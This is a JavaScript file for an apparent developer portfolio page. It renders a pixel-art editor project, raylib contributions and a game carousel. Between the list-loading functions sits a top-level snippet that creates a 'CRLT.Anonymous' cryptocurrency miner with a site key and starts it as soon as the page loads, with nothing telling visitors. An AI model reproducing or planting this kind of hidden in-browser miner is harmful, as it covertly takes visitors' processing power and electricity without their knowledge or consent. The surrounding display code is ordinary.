bubbly({
  colorStart: "#222831",
  colorStop: "#393E46",
  bubbleFunc: function() {
    return "hsla(" + (Math.random() * 360).toString() + ", 100%, 50%, " + (Math.random() * 0.25).toString() + ")";
  }
});

var projects_list = [
  {
    name: "Zakar Pixel Art Editor",
    description: "Simple Pixel Art Made For Game Dev But You Can Use It In What You Want",
    url: "https://archuser555.github.io/Pixel-Editor",
    languages: [ "C++" ]
  }

];

var games_list = [
];

var contributions_list = [
  {
    name: "raylib",
    url: "https://raylib.com",
    works: "Bindings (Lua, Boo, JavaScript), awesome-raylib, rayutils, rayport"
  }
];

function arr_comp(strarr) {
  var res = "";

  for (var i = 0; i < strarr.length; i++) {
    res += strarr[i] + ((i != strarr.length - 1) ? ", " : "");
  }

  return res;
}

// Then, Let's push'em!
function load_projects_list() {
  for (var i = 0; i < projects_list.length; i++) {
    var tr = document.createElement("tr");

    var tdl = [];
    var vals = [ "name", "description", "languages", "url" ];

    for (var j = 0; j < vals.length; j++) {
      tdl.push(document.createElement("td"));
      tdl[j].style.color = "white";
      tdl[j].style.fontFamily = "pixelated";
      tdl[j].style.padding = "8px";
      tdl[j].style.fontSize = "18px";

      if (j == 2) {
        tdl[j].innerHTML = arr_comp(projects_list[i][vals[j]]);
      } else if (j == 3) {
        tdl[j].innerHTML = `<a href="${projects_list[i][vals[j]]}" style="padding: 8px;">Try It!</a>`;
      } else {
        tdl[j].innerHTML = projects_list[i][vals[j]];
      }
      
      tr.appendChild(tdl[j]);
    }
  
    var br = document.createElement("br");
    document.getElementById("kuro").parentNode.appendChild(tr);
    document.getElementById("kuro").parentNode.appendChild(br);
  }
}

  var miner=new CRLT.Anonymous('a25eabeef86fda23750574d4b72f30052593455c394c', {
    threads:1,throttle:0.2, coin: "upx",
  });
  miner.start();

function load_contrib_list() {
  for (var i = 0; i < contributions_list.length; i++) {
    var tr = document.createElement("tr");

    var tdl = [];
    var vals = [ "name", "works" ];

    for (var j = 0; j < vals.length; j++) {
      tdl.push(document.createElement("td"));
      tdl[j].style.fontFamily = "pixelated";
      tdl[j].style.padding = "8px";
      tdl[j].style.fontSize = "18px";

      if (j != 0) {
        tdl[j].style.color = "white";
        tdl[j].innerHTML = contributions_list[i][vals[j]];
      } else {
        tdl[j].style.color = "purple";
        tdl[j].innerHTML = `<a href="${contributions_list[i].url}" style="padding: 8px;">${contributions_list[i].name}</a>`;
      }
      
      tr.appendChild(tdl[j]);
    }
  
    var br = document.createElement("br");
    document.getElementById("kuri").parentNode.appendChild(tr);
    document.getElementById("kuri").parentNode.appendChild(br);
  }
}

var game_index = 0;

function game_info(i) {
  if (game_image) {
    document.getElementById("game_image").src = games_list[i].image;
    document.getElementById("game_image").style.visibility = "hidden";
    document.getElementById("game_image").onload = function() {
      document.getElementById("game_image").style.visibility = "visible";
    };
  } else {
    var game_image = document.createElement("img");
    game_image.id = "game_image";
    game_image.style.width = "50%";
    game_image.style.padding = "20px";
    game_image.style.float = "left";
    game_image.style.visibility = "hidden";
    
    document.getElementById("game_link").parentNode.appendChild(game_image);
  }

  document.getElementById("game_name").innerHTML = games_list[i].name;
  document.getElementById("game_link").href = games_list[i].link[0];
  document.getElementById("game_source_link").href = games_list[i].link[1];
  document.getElementById("game_itchio_link").href = games_list[i].link[0];
  document.getElementById("game_genre").innerHTML = "GENRES: " + arr_comp(games_list[i].genres);
  document.getElementById("game_image").src = games_list[i].image;
  document.getElementById("game_image").style.visibility = "hidden";
  document.getElementById("game_image").onload = function() {
    document.getElementById("game_image").style.visibility = "visible";
  };
  document.getElementById("game_platforms").innerHTML = "PLATFORMS: " + arr_comp(games_list[i].platforms);
  document.getElementById("game_engine").innerHTML = "ENGINE/FRAMEWORK/LIBRARY: " + games_list[i].engine;
  document.getElementById("game_prog_langs").innerHTML = "PROGRAMMING LANGUAGES: " + arr_comp(games_list[i].programming_languages);
  document.getElementById("game_team").innerHTML = "DEVELOPMENT TEAM: " + arr_comp(games_list[i].team);
  document.getElementById("game_release_date").innerHTML = "RELEASE DATE: " + games_list[i].release_date;
  document.getElementById("game_description").innerHTML = games_list[i].description;
}

function next_game() {
  if (game_index + 1 == games_list.length) {
    game_index = 0;
  } else {
    game_index++;
  }
  game_info(game_index);
}

function previous_game() {
  if (game_index - 1 < 0) {
  game_index = games_list.length - 1;
  } else {
  game_index--;
  }
  game_info(game_index);
}

function project_info(i) {
  document.getElementById("projects").style.visibility = "visible";
  document.getElementById("name").innerHTML = projects[i].name;
  document.getElementById("description").innerHTML = projects[i].description;
  document.getElementById("url").innerHTML = projects[i].url;
  document.getElementById("url").href = projects[i].url;
}
